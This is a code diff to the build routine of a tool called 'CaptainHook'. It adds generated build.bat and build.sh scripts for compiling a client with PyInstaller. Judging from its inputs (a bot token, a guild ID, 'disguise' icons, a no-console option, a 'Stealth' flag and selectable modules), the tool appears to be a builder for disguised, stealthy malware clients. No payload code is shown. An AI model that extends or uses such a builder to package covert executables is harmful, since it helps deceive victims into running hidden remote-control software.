@@ -208,9 +208,16 @@ def build(token, guild_id, preset_name, disguise_name):
         if os.name == 'nt':
             cmd = f"pyinstaller --onefile {noconsole} --icon={disguise['icon']} --name CaptainHook --paths={staging_root} {hidden_imports_str} build_staging/src/client/main.py"
             ext = ".exe"
+            script_name = "dist/build.bat"
+            with open(script_name, "w") as f:
+                f.write(f"@echo off\n{cmd}\n")
         else:
             cmd = f"pyinstaller --onefile {noconsole} --name CaptainHook --paths={staging_root} {hidden_imports_str} build_staging/src/client/main.py"
             ext = ""
+            script_name = "dist/build.sh"
+            with open(script_name, "w") as f:
+                f.write(f"#!/bin/bash\n{cmd}\n")
+            os.chmod(script_name, 0o755)
         
     # Clear the progress and show success
     console.print("\n[bold green]✅ STAGING SUCCESSFUL![/bold green]")
@@ -224,11 +231,17 @@ def build(token, guild_id, preset_name, disguise_name):
     table.add_row("Modules", ", ".join(preset['modules']))
     table.add_row("Stealth", "[green]ENABLED[/green]" if preset['stealth'] else "[red]DISABLED[/red]")
     table.add_row("Output", f"dist/CaptainHook{ext}")
+    table.add_row("Script", f"[bold yellow]{script_name}[/bold yellow]")
     console.print(table)
 
     console.print("\n[bold yellow]🚀 Final Step: Run the command below to compile:[/bold yellow]")
     console.print("-" * 80)
-    console.print(f"[white]{cmd}[/white]")
+    if os.name == 'nt':
+        console.print(f"[white].\\{script_name}[/white]")
+    else:
+        console.print(f"[white]./{script_name}[/white]")
+    console.print("-" * 80)
+    console.print(f"[dim]Alternative: {cmd}[/dim]")
     console.print("-" * 80)
 
     console.print("\n[bold cyan]💡 Cross-Platform Tip:[/bold cyan]")
